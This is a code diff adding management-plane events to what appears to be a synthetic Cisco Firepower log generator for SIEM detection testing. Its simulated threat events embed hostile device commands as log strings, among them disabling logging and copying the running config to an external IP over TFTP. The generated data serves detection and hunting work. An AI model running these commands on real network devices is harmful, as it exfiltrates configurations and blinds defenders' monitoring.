@@ -50,13 +50,14 @@
 import random
 import hashlib
 import time
-from datetime import datetime, timezone
+from datetime import datetime, timedelta, timezone
 from ipaddress import ip_network, AddressValueError
 
 try:
     from modules import resolver
     from modules import threat_files
     from modules import threat_domains
+    from modules import mgmt_plane
     from modules.session_utils import (get_random_user, rand_ip_from_network,
         stable_vpn_ip, stable_mail_servers, weighted_destination, get_user_agent,
         novel_country_vpn_ip, tor_vpn_ip, random_external_ip,
@@ -66,6 +67,7 @@ except ImportError:
     import resolver
     import threat_files
     import threat_domains
+    import mgmt_plane
     from session_utils import (get_random_user, rand_ip_from_network,
         stable_vpn_ip, stable_mail_servers, weighted_destination, get_user_agent,
         novel_country_vpn_ip, tor_vpn_ip, random_external_ip,
@@ -178,6 +180,13 @@ _DEFAULT_THREAT_EVENTS = [
      "xsiam_alert": "New FTP Server"},
     {"event": "rare_smtp_session",     "weight": 2,  "analytic": True,
      "xsiam_alert": "Rare SMTP/S Session"},
+    # Management plane (2026-10-19, gocortexio advisory corpus MANAGEMENT patterns).
+    # No shipped Cortex analytic covers device administration: hunting / correlation.
+    {"event": "mgmt_admin_unexpected_source", "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "mgmt_config_route_change",     "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "mgmt_logging_suppressed",      "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "mgmt_config_harvest",          "weight": 1, "analytic": False, "xsiam_alert": None},
+    {"event": "snmp_unexpected_source",       "weight": 1, "analytic": False, "xsiam_alert": None},
 ]
 
 # --- Display-name mapping (same pattern as checkpoint_firewall.py) ---
@@ -1256,6 +1265,14 @@ def _generate_benign_log(config, session_context=None):
       software_update   2%  — large HTTPS download (Windows Update / AV definitions)
       ftp               2%  — scheduled FTP file transfers (UEBA baseline)
     """
+    # Management plane baseline, ahead of the roll: ~40 admin sessions and ~800 SNMP
+    # polls a day at one call per second.
+    mroll = random.random()
+    if mroll < 0.0005:
+        return _ftd_mgmt_admin_session(config, session_context)
+    if mroll < 0.01:
+        return _ftd_snmp_poll(config, session_context)
+
     user, src_ip, shost = _get_user_and_ip(config, session_context)
     roll = random.random()
 
@@ -3582,6 +3599,157 @@ def _generate_rare_smtp_session_event(config, src_ip, user, shost=None):
 
 
 
+# Management plane
+#
+# FTD reports device administration as Cisco syslog, not CEF: %FTD-6-605005 login,
+# %FTD-6-113004/113015 AAA, %FTD-7-111009 / %FTD-5-111010 commands, %FTD-5-111008
+# write memory, %FTD-5-611103 logout -- the ASA catalog (mgmt_plane.cisco_admin_session).
+# The Firepower modeling rule's "cefVersion = null" branch runs the same parse_cisco()
+# model as Cisco ASA over these. SNMP is plain connection data (CEF CONNECTION, UDP/161).
+
+def _ftd_syslog(config, msg, event_time=None, hostname=None):
+    host = hostname or _get_config(config).get('hostname', 'Cisco-FTD')
+    sev = int(msg.split('-')[1]) if msg.startswith('%FTD-') else 6
+    ts = (event_time or datetime.now(timezone.utc)).strftime("%Y-%m-%dT%H:%M:%SZ")
+    return f"<{20 * 8 + sev}>{ts} {host} : {msg}"
+
+
+def _ftd_admin_session(config, user, src_ip, commands, start=None, hostname=None,
+                       aaa_failures=0, gap=(2, 25), write_mem=False, logout=True, iface=None):
+    fc = _get_config(config)
+    pairs = mgmt_plane.cisco_admin_session(
+        "FTD", user, src_ip, commands,
+        aaa_server=fc.get('aaa_server', config.get('cisco_asa_config', {}).get('aaa_server', '10.0.1.10')),
+        mgmt_ip=fc.get('management_ip', '10.0.30.2'), outside_ip=fc.get('outside_ip', '203.0.113.30'),
+        iface=iface, start=start, aaa_failures=aaa_failures, gap=gap,
+        write_mem=write_mem, logout=logout)
+    return [_ftd_syslog(config, m, t, hostname) for t, m in pairs]
+
+
+def _ftd_snmp_conn(config, src_ip, user, shost, dst, ts=None):
+    start_ms, end_ms = _conn_timing(random.randint(5, 900))
+    if ts:
+        start_ms = int(ts.timestamp() * 1000)
+        end_ms = start_ms + random.randint(5, 900)
+    iface = _get_config(config).get('inbound_interface', 'inside')
+    fields = _base_fields(config, src_ip, user, shost)
+    fields['deviceInboundInterface'] = iface
+    fields['deviceOutboundInterface'] = iface
+    fields.update({
+        "_sig_id": SIG_IDS["CONNECTION"], "act": "Allow", "app": "SNMP",
+        "proto": "17", "dst": dst, "dpt": 161,
+        "cs1": _ac_policy(config), "cs1Label": "fwPolicy",
+        "cs2": "Allow_Internal_Mgmt", "cs2Label": "fwRule",
+        "cefSeverity": "3", "bytesOut": random.randint(60, 300), "bytesIn": random.randint(200, 40000),
+        "outcome": "SUCCESS", "reason": "Traffic Allowed",
+        "msg": f"SNMP from {src_ip} to {dst}:161", "start": start_ms, "end": end_ms,
+    })
+    return _format_firepower_cef(config, fields, "CONNECTION STATISTICS")
+
+
+def _ftd_mgmt_admin_session(config, session_context=None):
+    """BENIGN: NOC admin status check; one session in five makes a routine change."""
+    user, src = mgmt_plane.admin_user(config), mgmt_plane.admin_source(config)
+    cmds = random.sample(mgmt_plane.CISCO_SHOW_COMMANDS, random.randint(2, 5))
+    change = random.random() < 0.2
+    if change:
+        n = random.randint(20, 240)
+        cmds += [c.format(n=n) for c in random.choice(mgmt_plane.CISCO_ROUTINE_CHANGES)]
+    return _ftd_admin_session(config, user, src, cmds, write_mem=change)
+
+
+def _ftd_mgmt_config_backup(config, session_context=None):
+    """BENIGN: the nightly backup job reads the running config."""
+    host, acct = mgmt_plane.backup(config)
+    return _ftd_admin_session(config, acct, host, ["show running-config"], gap=(1, 3))
+
+
+def _ftd_snmp_poll(config, session_context=None):
+    """BENIGN: the monitoring poller reads SNMP from infrastructure behind the FTD."""
+    return _ftd_snmp_conn(config, mgmt_plane.snmp_poller(config), None, None,
+                          random.choice(mgmt_plane.network_devices(config)))
+
+
+def _generate_mgmt_admin_unexpected_source(config, session_context=None):
+    """THREAT device-admin-from-unexpected-source (pattern described in cisco_asa)."""
+    src, kind = mgmt_plane.unexpected_source(config, session_context)
+    return _ftd_admin_session(config, mgmt_plane.admin_user(config), src,
+                              random.sample(mgmt_plane.CISCO_SHOW_COMMANDS, random.randint(3, 6)),
+                              iface="outside" if kind == "external" else "inside",
+                              aaa_failures=random.randint(0, 2))
+
+
+def _generate_mgmt_config_route_change(config, session_context=None):
+    """THREAT network-device-config-or-route-change: rogue route + permit-any + capture."""
+    src, kind = (mgmt_plane.unexpected_source(config, session_context)
+                 if random.random() < 0.6 else (mgmt_plane.admin_source(config), "admin-subnet"))
+    return _ftd_admin_session(config, mgmt_plane.admin_user(config), src,
+                              mgmt_plane.cisco_route_change_commands(rare_external_ip()),
+                              iface="outside" if kind == "external" else None, write_mem=True)
+
+
+_FTD_SUPPRESS_KEY = "cisco_firepower"
+
+
+def _ftd_logging_on_lines(config, user, src, start):
+    pairs = [(start, mgmt_plane.cisco_cmd("FTD", user, src, "logging enable")),
+             (start + timedelta(seconds=3), f"%FTD-5-111008: User '{user}' executed the 'write memory' command."),
+             (start + timedelta(seconds=6), f"%FTD-5-611103: User logged out: Uname: {user}")]
+    return [_ftd_syslog(config, m, t) for t, m in pairs]
+
+
+def _generate_mgmt_logging_suppressed(config, session_context=None, backdate=False):
+    """THREAT network-device-logging-suppressed-for-a-window (mechanics in cisco_asa)."""
+    user = mgmt_plane.admin_user(config)
+    src, _ = (mgmt_plane.unexpected_source(config, session_context)
+              if random.random() < 0.5 else (mgmt_plane.admin_source(config), "admin-subnet"))
+    window = mgmt_plane.suppression_window_seconds()
+    now = datetime.now(timezone.utc)
+    start = now - timedelta(seconds=window + 60) if backdate else None
+    off = _ftd_admin_session(config, user, src, ["show logging", "no logging enable"],
+                             start=start, gap=(3, 20), logout=False)
+    if backdate:
+        return off + _ftd_logging_on_lines(config, user, src, now)
+    mgmt_plane.open_suppression(_FTD_SUPPRESS_KEY, window, user, src)
+    return off
+
+
+def _generate_mgmt_config_harvest(config, session_context=None):
+    """THREAT scripted-device-config-harvesting: one source, several FTDs, seconds each."""
+    src, kind = (mgmt_plane.unexpected_source(config, session_context)
+                 if random.random() < 0.5 else (random.choice(mgmt_plane.conf(config)["jump_hosts"]), "jump-host"))
+    user, drop = mgmt_plane.admin_user(config), rare_external_ip()
+    devices = mgmt_plane.sibling_hostnames(_get_config(config).get('hostname', 'Cisco-FTD'),
+                                           random.randint(3, 5))
+    t, out = datetime.now(timezone.utc) - timedelta(seconds=75 * len(devices)), []
+    for dev in devices:
+        cmds = list(mgmt_plane.CISCO_HARVEST_COMMANDS) + [
+            f"copy /noconfirm running-config tftp://{drop}/{dev.lower()}.cfg"]
+        out += _ftd_admin_session(config, user, src, cmds, start=t, hostname=dev, gap=(1, 2),
+                                  iface="outside" if kind == "external" else None)
+        t += timedelta(seconds=random.randint(15, 60))
+    return out
+
+
+def _generate_snmp_unexpected_source(config, session_context=None):
+    """THREAT snmp-from-unexpected-source: a workstation walks every network device."""
+    user, src, shost = _get_user_and_ip(config, session_context)
+    t, out = datetime.now(timezone.utc) - timedelta(seconds=40), []
+    for dev in mgmt_plane.network_devices(config):
+        out.append(_ftd_snmp_conn(config, src, user, shost, dev, ts=t))
+        t += timedelta(seconds=random.randint(1, 4))
+    return out
+
+
+_MGMT_GENERATORS = {
+    "mgmt_admin_unexpected_source": _generate_mgmt_admin_unexpected_source,
+    "mgmt_config_route_change":     _generate_mgmt_config_route_change,
+    "mgmt_config_harvest":          _generate_mgmt_config_harvest,
+    "snmp_unexpected_source":       _generate_snmp_unexpected_source,
+}
+_MGMT_BACKDATE = {"on": False}
+
+
 def _generate_threat_log(config, session_context=None, forced_event=None):
     """Picks and generates a random threat event from the configured or fallback mix.
 
@@ -3615,6 +3783,13 @@ def _generate_threat_log(config, session_context=None, forced_event=None):
         )[0]
 
     print(f"    - Firepower Module simulating: {chosen} from {src_ip}")
+
+    # --- Management plane (sources come from mgmt_plane) ---
+    if chosen in _MGMT_GENERATORS:
+        return (_MGMT_GENERATORS[chosen](config, session_context), chosen)
+    if chosen == 'mgmt_logging_suppressed':
+        return (_generate_mgmt_logging_suppressed(config, session_context,
+                                                  backdate=_MGMT_BACKDATE["on"]), chosen)
 
     # --- Multi-event generators -- return (list, event_name) ---
     if chosen == 'port_scan':
@@ -3854,7 +4029,20 @@ def generate_log(config, scenario=None, threat_level="Realistic",
             return logs
 
         # Named threat from dashboard — dispatch to the specific event
-        return _generate_threat_log(config, session_context, forced_event=scenario_event)
+        _MGMT_BACKDATE["on"] = bool(context.get("mgmt_backdate"))
+        try:
+            return _generate_threat_log(config, session_context, forced_event=scenario_event)
+        finally:
+            _MGMT_BACKDATE["on"] = False
+
+    # --- Logging suppressed: silent until the window closes, then re-enabled ---
+    _sup = mgmt_plane.suppression_state(_FTD_SUPPRESS_KEY)
+    if _sup == "active":
+        return None
+    if _sup:
+        return _ftd_logging_on_lines(config, _sup["user"], _sup["src"], datetime.now(timezone.utc))
+    if mgmt_plane.backup_due(_FTD_SUPPRESS_KEY):
+        return _ftd_mgmt_config_backup(config, session_context)
 
     # --- Benign only ---
     if benign_only or threat_level == "Benign Traffic Only":
